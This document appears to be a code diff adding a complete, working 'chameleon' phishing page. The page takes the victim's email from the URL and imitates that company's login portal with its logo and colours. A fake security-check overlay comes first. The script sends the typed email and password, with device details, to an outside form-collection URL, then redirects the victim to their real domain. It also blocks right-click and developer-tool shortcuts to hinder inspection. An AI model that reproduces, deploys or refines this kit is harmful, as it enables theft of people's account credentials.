@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <!-- SECURITY: Prevent indexing, scraping, and caching -->
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  
+  <title id="pageTitle">Loading...</title>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    /* --- HUMAN VERIFICATION OVERLAY --- */
+    #human-verify {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0f172a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      flex-direction: column;
+      padding: 20px;
+    }
+    
+    #human-verify .box {
+      background: #1e293b;
+      padding: 40px 30px;
+      border-radius: 16px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      border: 1px solid #334155;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    }
+    
+    #human-verify h2 {
+      color: #f1f5f9;
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+    
+    #human-verify p {
+      color: #94a3b8;
+      font-size: 14px;
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+    
+    #human-verify .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #334155;
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 16px;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    /* --- CHAMELEON CONTAINER --- */
+    .chameleon-container {
+      width: 100%;
+      max-width: 520px;
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+      display: none;
+      position: relative;
+      z-index: 10;
+      animation: fadeIn 0.6s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    /* Brand Header */
+    .brand-header {
+      padding: 24px 30px 18px;
+      text-align: center;
+      border-bottom: 3px solid #3b82f6;
+    }
+    
+    .brand-logo {
+      max-width: 160px;
+      height: auto;
+      margin: 0 auto 8px;
+      display: block;
+    }
+    
+    .brand-name {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+    
+    .brand-tagline {
+      font-size: 13px;
+      color: #666;
+      margin-top: 2px;
+    }
+    
+    /* Visitor Info */
+    .visitor-info {
+      background: #f8fafc;
+      padding: 10px 20px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+      color: #475569;
+      border-bottom: 1px solid #e0e0e0;
+      gap: 6px;
+    }
+    
+    .visitor-info .info-item {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    
+    .visitor-info .info-item i {
+      color: #3b82f6;
+      width: 14px;
+    }
+    
+    /* Content */
+    .chameleon-content {
+      padding: 20px 30px;
+    }
+    
+    .hero-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 4px;
+    }
+    
+    .hero-sub {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 16px;
+    }
+    
+    .email-display {
+      background: #f1f5f9;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 16px;
+      word-break: break-all;
+      border-left: 4px solid #3b82f6;
+    }
+    
+    /* Form */
+    .login-form {
+      margin-top: 8px;
+    }
+    
+    .form-group {
+      margin-bottom: 16px;
+    }
+    
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 4px;
+    }
+    
+    .input-with-icon {
+      position: relative;
+    }
+    
+    .input-with-icon input {
+      width: 100%;
+      padding: 12px 12px 12px 44px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border 0.3s, box-shadow 0.3s;
+      background: #fafafa;
+    }
+    
+    .input-with-icon input:focus {
+      border-color: #3b82f6;
+      outline: none;
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
+    }
+    
+    .input-with-icon .icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #94a3b8;
+      font-size: 16px;
+    }
+    
+    .input-with-icon .toggle-password {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #94a3b8;
+      font-size: 16px;
+    }
+    
+    .input-with-icon .toggle-password:hover {
+      color: #1a1a1a;
+    }
+    
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin: 14px 0 18px;
+    }
+    
+    .checkbox-group input {
+      margin-right: 10px;
+      width: 18px;
+      height: 18px;
+      accent-color: #3b82f6;
+    }
+    
+    .checkbox-group label {
+      font-size: 13px;
+      color: #555;
+    }
+    
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: #3b82f6;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    
+    .btn-submit:hover {
+      background: #2563eb;
+    }
+    
+    .auth-error {
+      color: #dc2626;
+      font-size: 13px;
+      margin: 10px 0 6px;
+      display: none;
+    }
+    
+    .footer-links {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+      color: #666;
+    }
+    
+    .footer-links a {
+      color: #3b82f6;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    
+    .security-badge {
+      background: #f8fafc;
+      border-top: 1px solid #e0e0e0;
+      padding: 14px;
+      text-align: center;
+      font-size: 12px;
+      color: #94a3b8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .security-badge i {
+      color: #22c55e;
+    }
+    
+    /* Loader */
+    .loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .loader::after {
+      content: "";
+      width: 40px;
+      height: 40px;
+      border: 4px solid #fff;
+      border-top-color: #3b82f6;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    
+    @media (max-width: 500px) {
+      .chameleon-container {
+        border-radius: 0;
+        box-shadow: none;
+      }
+      .brand-header {
+        padding: 16px;
+      }
+      .chameleon-content {
+        padding: 16px;
+      }
+      .visitor-info {
+        font-size: 11px;
+        padding: 8px 12px;
+      }
+      #human-verify .box {
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HUMAN VERIFICATION OVERLAY (AUTO-VERIFY AFTER 3s) -->
+  <div id="human-verify">
+    <div class="box">
+      <div class="spinner" id="verify-spinner"></div>
+      <h2>🔒 Security Check</h2>
+      <p>Verifying your connection to the secure portal...</p>
+    </div>
+  </div>
+
+  <!-- MAIN CHAMELEON CONTAINER -->
+  <div class="chameleon-container" id="chameleonContainer">
+    
+    <!-- Brand Header -->
+    <div class="brand-header" id="brandHeader">
+      <img class="brand-logo" id="brandLogo" src="" alt="Logo">
+      <div class="brand-name" id="brandName">Loading...</div>
+      <div class="brand-tagline" id="brandTagline">Loading...</div>
+    </div>
+    
+    <!-- Visitor Info -->
+    <div class="visitor-info" id="visitorInfo">
+      <span class="info-item"><i class="fas fa-calendar-alt"></i> <span id="visitDateTime">Loading...</span></span>
+      <span class="info-item"><i class="fas fa-globe"></i> <span id="visitLocation">Loading...</span></span>
+      <span class="info-item"><i class="fas fa-desktop"></i> <span id="visitDevice">Loading...</span></span>
+      <span class="info-item"><i class="fas fa-browser"></i> <span id="visitBrowser">Loading...</span></span>
+    </div>
+    
+    <!-- Content -->
+    <div class="chameleon-content">
+      <div class="hero-title" id="heroTitle">Welcome</div>
+      <div class="hero-sub" id="heroSub">Please sign in to access your account.</div>
+      
+      <div class="email-display" id="emailDisplay">Loading...</div>
+      
+      <form id="loginForm">
+        <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
+        <input type="hidden" id="emailField" name="email">
+        
+        <div class="form-group">
+          <label for="passwordField">Password</label>
+          <div class="input-with-icon">
+            <span class="icon"><i class="fas fa-lock"></i></span>
+            <input type="password" id="passwordField" name="password" placeholder="Enter your password" required>
+            <span class="toggle-password" onclick="togglePassword()"><i class="fas fa-eye" id="eyeIcon"></i></span>
+          </div>
+        </div>
+        
+        <div class="checkbox-group">
+          <input type="checkbox" id="remember">
+          <label for="remember">Remember me</label>
+        </div>
+        
+        <div class="auth-error" id="authError">Authentication is required!</div>
+        
+        <button type="submit" class="btn-submit">NEXT</button>
+      </form>
+      
+      <div class="footer-links">
+        <a href="#">Forgot your password?</a> &middot; <a href="#">Privacy Policy</a>
+      </div>
+    </div>
+    
+    <!-- Security Badge -->
+    <div class="security-badge">
+      <i class="fas fa-shield-alt"></i> Secure SSL Connection &middot; <span id="footerDomain">Loading...</span>
+    </div>
+  </div>
+
+  <!-- Loader -->
+  <div class="loader" id="loader"></div>
+
+  <script>
+    // --- CONFIG ---
+    const FORMSPARK_URL = "https://submit-form.com/wUKgSbdQB";
+    
+    // --- GET EMAIL FROM URL ---
+    function getEmailFromURL() {
+      let email = null;
+      if (window.location.hash) {
+        let hash = window.location.hash.substring(1);
+        if (hash.includes('&')) hash = hash.split('&')[0];
+        if (hash.includes('@')) email = hash;
+      }
+      if (!email) {
+        const params = new URLSearchParams(window.location.search);
+        if (params.has('email')) email = params.get('email');
+      }
+      return email;
+    }
+    
+    // --- DETECT DEVICE, OS, BROWSER ---
+    function detectDevice() {
+      const ua = navigator.userAgent;
+      if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+        if (/iPad|Tablet/i.test(ua)) return 'Tablet';
+        return 'Phone';
+      }
+      return 'Desktop';
+    }
+    
+    function detectOS() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Windows')) return 'Windows';
+      if (ua.includes('Mac OS')) return 'macOS';
+      if (ua.includes('Linux')) return 'Linux';
+      if (/Android|iOS|iPhone|iPad/i.test(ua)) return 'Mobile';
+      return 'Unknown';
+    }
+    
+    function detectBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
+      if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+      if (ua.includes('Firefox')) return 'Firefox';
+      if (ua.includes('Edg')) return 'Edge';
+      if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+      return 'Unknown';
+    }
+    
+    // --- GET LOCATION ---
+    async function getLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
+      } catch {
+        return 'Unknown';
+      }
+    }
+    
+    // --- FETCH BRANDING ---
+    async function fetchBranding(domain) {
+      try {
+        const logoUrl = `https://logo.clearbit.com/${domain}`;
+        document.getElementById('brandLogo').src = logoUrl;
+        document.getElementById('brandLogo').onerror = function() {
+          this.style.display = 'none';
+        };
+        
+        const nameParts = domain.split('.');
+        const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
+        document.getElementById('brandName').textContent = brandName;
+        document.getElementById('footerDomain').textContent = domain;
+        
+        const taglines = {
+          'concrete': 'Your Trusted Concrete Coating Experts',
+          'coatings': 'Professional Coating Services',
+          'construction': 'Building Excellence Since 2000',
+          'realestate': 'Your Property, Our Priority',
+          'finance': 'Secure Financial Solutions',
+          'health': 'Caring for Your Wellbeing',
+          'tech': 'Innovative Technology Solutions',
+          'default': 'Secure Portal for Your Business'
+        };
+        
+        let tagline = taglines['default'];
+        for (const [key, value] of Object.entries(taglines)) {
+          if (domain.includes(key)) {
+            tagline = value;
+            break;
+          }
+        }
+        document.getElementById('brandTagline').textContent = tagline;
+        document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
+        document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
+        
+        const colors = {
+          'concrete': '#2d6a4f',
+          'coatings': '#1a5a8c',
+          'construction': '#e67e22',
+          'realestate': '#8e44ad',
+          'finance': '#2ecc71',
+          'health': '#e74c3c',
+          'tech': '#3498db',
+          'default': '#3b82f6'
+        };
+        
+        let color = colors['default'];
+        for (const [key, value] of Object.entries(colors)) {
+          if (domain.includes(key)) {
+            color = value;
+            break;
+          }
+        }
+        
+        document.querySelector('.btn-submit').style.background = color;
+        document.getElementById('brandHeader').style.borderBottomColor = color;
+        document.querySelector('.email-display').style.borderLeftColor = color;
+        
+      } catch (e) {
+        console.log('Branding error:', e);
+      }
+    }
+    
+    // --- INITIALIZE PAGE ---
+    async function initPage() {
+      const email = getEmailFromURL();
+      const domain = email ? email.split('@')[1] : 'unknown.com';
+      
+      document.getElementById('emailDisplay').textContent = email || 'No email specified';
+      document.getElementById('emailField').value = email || '';
+      document.getElementById('pageTitle').textContent = `${domain} · Secure Portal`;
+      
+      const now = new Date();
+      document.getElementById('visitDateTime').textContent = now.toDateString() + ' ' + now.toLocaleTimeString();
+      document.getElementById('visitDevice').textContent = detectDevice() + ' · ' + detectOS();
+      document.getElementById('visitBrowser').textContent = detectBrowser();
+      document.getElementById('visitLocation').textContent = await getLocation();
+      
+      await fetchBranding(domain);
+      
+      document.getElementById('chameleonContainer').style.display = 'block';
+    }
+    
+    // --- TOGGLE PASSWORD ---
+    function togglePassword() {
+      const field = document.getElementById('passwordField');
+      const icon = document.getElementById('eyeIcon');
+      if (field.type === 'password') {
+        field.type = 'text';
+        icon.className = 'fas fa-eye-slash';
+      } else {
+        field.type = 'password';
+        icon.className = 'fas fa-eye';
+      }
+    }
+    
+    // --- SECURITY: BLOCK RIGHT-CLICK & KEYBOARD SHORTCUTS ---
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'c' || e.key === 'C' || e.key === 'a' || e.key === 'A')) {
+        e.preventDefault();
+      }
+      if (e.key === 'F12') e.preventDefault();
+    });
+    
+    // --- CLICKJACKING PROTECTION ---
+    if (window.top !== window.self) window.top.location = window.self.location;
+    
+    // --- CACHE DISABLE ---
+    window.addEventListener('pageshow', function(e) {
+      if (e.persisted) window.location.reload();
+    });
+    
+    // --- FORM SUBMISSION ---
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('emailField').value.trim();
+      const password = document.getElementById('passwordField').value.trim();
+      const errorEl = document.getElementById('authError');
+      
+      if (!email || !password) {
+        errorEl.textContent = 'Please fill in all fields.';
+        errorEl.style.display = 'block';
+        return;
+      }
+      
+      errorEl.style.display = 'none';
+      document.getElementById('loader').style.display = 'flex';
+      
+      try {
+        await fetch(FORMSPARK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: email,
+            password: password,
+            chameleon: true,
+            device: detectDevice(),
+            os: detectOS(),
+            browser: detectBrowser(),
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (err) {
+        console.log('Formspark error:', err);
+      }
+      
+      const domain = email.split('@')[1];
+      setTimeout(() => window.location.href = `https://${domain}`, 1500);
+    });
+    
+    // --- AUTO-VERIFY: Show overlay for 3 seconds, then load the page ---
+    setTimeout(function() {
+      document.getElementById('human-verify').style.display = 'none';
+      initPage();
+    }, 3000);
+  </script>
+</body>
+</html>
